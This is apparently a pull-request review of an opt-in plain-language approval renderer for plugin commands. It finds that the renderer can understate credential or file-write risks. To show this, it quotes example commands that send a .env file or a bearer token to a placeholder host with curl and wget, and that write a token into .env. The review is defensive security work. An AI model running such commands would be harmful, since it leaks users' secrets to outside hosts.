## Summary

Keep open: the opt-in plain-language approval direction is useful and the PR now has real behavior proof, but current head still has credential/file-write cases where `simple` mode can suppress the raw command while understating what is being sent or written.

## What This Changes

The PR adds an opt-in `approvals.plugin.language` setting with `simple` and `simple-technical` plugin approval rendering, wires it through plugin approval delivery for Telegram/Matrix/fallback paths, updates schema/docs/tests, and includes unrelated oc-path formatting churn.

## Best Possible Solution

Keep the opt-in renderer direction, but make the command summarizer fail closed or show a redacted preview for all credential-bearing network options and sensitive redirected writes, then add focused regressions and trim unrelated churn before landing.

## Reproduction Assessment

Yes. Source inspection plus the local curl/wget option contracts gives high-confidence examples: `curl -H @.env https://example.test`, `wget --header='Authorization: Bearer s3cr3t' https://example.test`, and `printf '%s\n' token > .env` are not conservatively surfaced by the current simple renderer.

## Solution Assessment

No, not yet. The opt-in plain-language approach is maintainable, but hiding raw details is only safe if credential/file-write cases fail closed or include a redacted preview with the affected target.
